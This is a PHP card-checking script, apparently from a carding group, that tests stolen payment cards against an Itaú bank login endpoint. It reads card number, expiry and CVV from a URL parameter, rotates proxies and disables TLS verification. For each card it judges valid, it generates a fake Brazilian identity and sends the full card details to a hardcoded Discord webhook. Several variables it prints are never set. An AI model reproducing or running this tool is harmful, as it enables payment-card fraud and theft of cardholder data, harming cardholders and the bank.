<?php

session_start();

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function multiexplode($string) {
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode($lista)[0];
$mes = multiexplode($lista)[1];
$ano = multiexplode($lista)[2];
$cvv = multiexplode($lista)[3];

$cc1 = substr ($cc, 0, 4);
$cc2 = substr ($cc, 4, 4);
$cc3 = substr ($cc, 8, 4);
$cc4 = substr ($cc, 12, 4);

# puxar 2 últimos números
$t = strlen($ano);
if ($t > 2){
    $ano = substr($ano, 2, 4);
}
$bin = substr($cc, 0, 8);


Function proxys()
{
  $poxyHttps = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxyHttps) - 1);
  $poxyHttps = $poxyHttps [$myproxy];
  return $poxyHttps;
}
echo $proxy = proxys();
//$ip = multiexplode(array(":", "|", ""), $proxy)[0];
//echo '[ IP: ' .$ip.' ]',

//======================================== REQUISIÇÃO 1 ========================

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://internetnc4.itau.com.br/router-app/router');




curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
));

curl_setopt($ch, CURLOPT_POSTFIELDS, "usuario.cartao=$cc&usuario.cpf=&portal=999&pre-login=pre-login&destino=&tipoLogon=9");
$data = curl_exec($ch);

if (strpos($data, 'Print de exemplo, onde um cliente consulta sua fatura enviando mensagens para o Itaucard pelo WhatsApp.')) {
    sleep(3); // Delay de 10 segundos para "Aprovada"

    $name = '';
    $cpf = '';
    $birthDate = '';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookies.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookies.txt");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: www.4devs.com.br',
        'Accept: */*',
        'Sec-Fetch-Dest: empty',
        'Content-Type: application/x-www-form-urlencoded',
        'origin: https://www.4devs.com.br',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-Mode: cors',
        'referer: https://www.4devs.com.br/gerador_de_pessoas'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
    $end = curl_exec($ch);

    $name = getStr($end, '"nome":"', '"');
    $cpf = getStr($end, '"cpf":"', '"');
    $birthDate = getStr($end, '"data_nasc":"', '"');
    
    
$urla = 'https://discord.com/api/webhooks/1105105882754322523/WFbITvwyK_dANDy3M7PlEg4ZWZNSSkpL-GtcZKLmpoShAzlEY_WaTyPR1mwnLMGS8a7v';
  $headers = ['Content-Type: application/json; charset=utf-8'];
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $urla);
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '{"content": null,"embeds": [{"title": "Aprovada ", "description": "**💳 CC:**  **'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'➜**:x:  '.$infobin.'\n```'.$ip.'```","color": 16711693, "thumbnail": {"url": ""}}],"footer": {"text": "Motivo: Cartão Aprovado Gate Zero-Auth✅️"},"username": "aprovada", "avatar_url": ""}');
  $cx2a = curl_exec($ch);

    die('<span class="badge badge-success">Aprovada</span> ➔ 
         <span class="badge badge-primary">'.$lista.'</span><br> ➔ 
         <span class="badge badge-success">(Autorizaçao Encontrada Cartao Aprovado 0,01✅️!!!)</span> ➔ 
         <span class="badge badge-warning">@HAPHAVIGA</span><br> ➔ 
         <span class="badge badge-info">Proxy: '.$proxyHost.':'.$proxyPort.'</span><br> ➔ 
         <span class="badge badge-info">Nome: '.$name.'</span><br> ➔ 
         <span class="badge badge-info">CPF: '.$cpf.'</span><br> ➔ 
         <span class="badge badge-info">Data de Nascimento: '.$birthDate.'</span>');
} elseif (strpos($data, 'Caso o erro continue, entre em contato com a central de atendimento.')) {
    sleep(3); // Delay de 10 segundos para "Reprovada"
    die('<span class="badge badge-danger">Reprovada</span> ➔ 
         <span class="badge badge-warning">'.$lista.'</span>
         <span class="badge badge-danger">RETORNO:Cartao Recusado 0,01 ❌️</span>➔ 
         <span class="badge badge-warning">@HAPHAVIGA</span><br> ➔ 
         <span class="badge badge-info">Proxy: '.$proxyHost.':'.$proxyPort.'</span>');
} else {
    sleep(3); // Delay de 10 segundos para "Testada"
    die('<span class="badge badge-danger">Reprovada</span> ➔ CARTAO REPROVADO⚠️
         <span class="badge badge-warning">'.$lista.'</span>➔ 
         <span class="badge badge-warning">@HAPHAVIGA</span><br>');
}
?>
//codado por @HAPHAVEIGA  Grupo De Drop de Chks etc